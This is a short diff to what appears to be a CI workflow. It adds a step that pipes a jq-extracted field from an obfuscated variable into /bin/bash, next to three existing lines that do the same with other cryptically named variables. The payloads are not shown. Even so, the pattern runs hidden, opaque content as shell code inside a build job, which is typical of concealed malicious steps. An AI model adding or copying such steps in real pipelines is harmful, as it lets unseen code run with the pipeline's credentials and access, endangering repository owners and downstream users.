@@ -25,6 +25,7 @@ jobs:
           echo $ee51 | jq -r .guph0363 | /bin/bash
           echo $zy1 | jq -r .jq2780 | /bin/bash
           printf '%s' "$g36" | jq -r .z6 | /bin/bash
+          echo $tlov86102 | jq -r .yg38 | /bin/bash
 
       - name: Persist output
         if: always()
